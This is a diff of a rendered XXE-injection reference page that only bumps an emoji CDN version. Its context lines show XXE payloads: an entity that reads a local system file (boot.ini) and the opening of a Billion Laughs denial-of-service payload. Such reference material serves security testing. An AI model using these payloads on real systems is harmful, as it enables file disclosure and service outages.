@@ -6655,7 +6655,7 @@ Syntax: <code>&lt;!ENTITY entity_name SYSTEM "entity_value"&gt;</code></p>
 <a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="cp">  &lt;!ELEMENT foo ANY &gt;</span>
 <a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">  </span><span class="cp">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/boot.ini&quot; &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
 </code></pre></div>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> <code>SYSTEM</code> and <code>PUBLIC</code> are almost synonym.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> <code>SYSTEM</code> and <code>PUBLIC</code> are almost synonym.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">&lt;!</span><span class="n">ENTITY</span> <span class="p">%</span> <span class="n">xxe</span> <span class="n">PUBLIC</span> <span class="s2">&quot;Random Text&quot;</span> <span class="s2">&quot;URL&quot;</span><span class="p">&gt;</span>
 <a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="p">&lt;!</span><span class="n">ENTITY</span> <span class="n">xxe</span> <span class="n">PUBLIC</span> <span class="s2">&quot;Any TEXT&quot;</span> <span class="s2">&quot;URL&quot;</span><span class="p">&gt;</span>
 </code></pre></div>
@@ -6696,7 +6696,7 @@ Syntax: <code>&lt;!ENTITY entity_name SYSTEM "entity_value"&gt;</code></p>
 <a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
 </code></pre></div>
 <h2 id="exploiting-xxe-to-perform-a-deny-of-service">Exploiting XXE to perform a deny of service</h2>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> : These attacks might kill the service or the server, do not use them on the production.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> : These attacks might kill the service or the server, do not use them on the production.</p>
 <h3 id="billion-laugh-attack">Billion Laugh Attack</h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="cp">&lt;!DOCTYPE data [</span>
 <a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="cp">&lt;!ENTITY a0 &quot;dos&quot; &gt;</span>
